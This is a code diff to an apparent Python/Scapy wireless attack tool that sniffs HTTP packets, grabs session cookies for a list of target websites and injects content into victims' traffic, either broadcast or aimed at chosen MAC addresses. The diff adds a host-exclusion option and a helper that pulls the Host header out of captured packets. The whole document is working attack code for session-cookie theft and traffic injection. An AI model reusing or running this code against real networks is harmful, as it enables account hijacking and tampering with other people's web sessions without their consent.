@@ -70,6 +70,10 @@ global covert
 global TARGETED
 global HITCOUNTER
 global mac_list
+global EXCLUSION
+global EXCLUDE_LIST
+EXCLUSION=0
+EXCLUDE_LIST=[]
 mac_list=[]
 TARGETED=0
 HITCOUNTER=2
@@ -153,7 +157,7 @@ def proc_packet(packet):
 		global websites
 		#CHECK IF THE COOKIE BELONGS TO ANY OF OUR TARGET WEBSITES
 		for website in websites:
-			if (host.lower().strip() in website.lower()):
+			if (host.lower().strip() in website.lower() and len(host.lower().strip())>2):
 				TARGET_IN_LIST=0
 				#BROADCAST MODE
 				if (TARGETED==0):
@@ -211,6 +215,26 @@ def proc_packet(packet):
 							t_finished = True
 				break
 
+
+def get_packet_host(packet):
+	host=""
+	packet1=packet
+	# EXTRACT RAW PAYLOAD FROM PACKET
+	try:
+		ret2 = "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
+		if (len(ret2.strip())>0):
+			ret = "\n[*] RECEIVED COOKIE\n"
+			arr=ret2.split("\n")
+			cookie=""
+			for line in arr:
+				if ('Host' in line):
+					host=line.split()[1]
+	except:
+		return 0
+	if (len(host)>0):
+		return host
+	else:
+		return 0
 #
 # Does some processing to check if the packet is a GET request to try to sniff out the Cookie
 #
@@ -229,6 +253,22 @@ def GET_print(packet):
 #
 def http_header(packet):
         http_packet=str(packet)
+	global EXCLUSION
+	global EXCLUDE_LIST
+	if (EXCLUSION==1):
+		try:
+			host=get_packet_host(packet)
+			if (not host):
+				ignore=1
+			else:
+				for item in EXCLUDE_LIST:
+					if (host in item):
+#						print "[DEBUG] Client is hitting exluded host",host
+						return 0
+		except:
+			print "FAILED TO GET PACKET HOST"
+	else:
+		pass
 	# LOADS THE REQUEST, specifically whatever is after GET
 	try:
 		getarg=packet.load.split()[1]
@@ -260,6 +300,22 @@ def process_targeted_packet(packet):
 		getarg=packet.load.split()[1]
 	except:
 		getarg="NULL"
+	global EXCLUSION
+	global EXCLUDE_LIST
+	if (EXCLUSION==1):
+		try:
+			host=get_packet_host(packet)
+			if (not host):
+				ignore=1
+			else:
+				for item in EXCLUDE_LIST:
+					if (host in item):
+						print "[DEBUG] Client is hitting exluded host",host
+						return 0
+		except:
+			print "FAILED TO GET PACKET HOST"
+	else:
+		pass
         if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html") or (getarg.find("/") and len(getarg.strip())<2))):
 		if packet.haslayer(IP):
 			for m_mac in mac_list:
@@ -409,7 +465,9 @@ def load_websites_targeted(websites_file):
 	websites=[]
 	f = open(websites_file,'r')
 	for line in f.readlines():
-		websites.append(line.strip())
+		if (line.strip()[0]!="#"):
+			websites.append(line.strip())
+	f.close()
 	return websites
 
 
@@ -425,12 +483,23 @@ def main(args):
 	global websites
 	global HITCOUNTER_STATIC
 	global HITCOUNTER
+	global EXCLUSION
+	global EXCLUDE_LIST
+
+	#CHECK FOR COOKIE COUNT
 	if (args.c is not None):
 		HITCOUNTER_STATIC=int(args.c)
 		HITCOUNTER=HITCOUNTER_STATIC
 	else:
 		HITCOUNTER_STATIC=1
 		HITCOUNTER=HITCOUNTER_STATIC
+
+	#CHECK FOR EXCLUDED HOSTS
+	if (args.exclude_hosts is not None):
+		EXCLUSION=1
+		EXCLUDE_LIST=args.exclude_hosts
+	else:
+		asd=1
 
 	#USE INJECT FILE
 	if (args.injection is not None):
@@ -489,6 +558,8 @@ if __name__ == '__main__':
 	parser.add_argument('-i',metavar='<interface>',required=True,help='Your injection interface')
 
 	parser.add_argument('-t',nargs='*',metavar='<MAC address>',help='Target MAC addresses')
+
+	parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='List of hosts to exclude from injection')
 
 	parser.add_argument('-o',metavar='<outfile>',help='Output File')
 	parser.add_argument('-c',metavar='<count>',help='Number of cookies to grab per website on the --websites list')
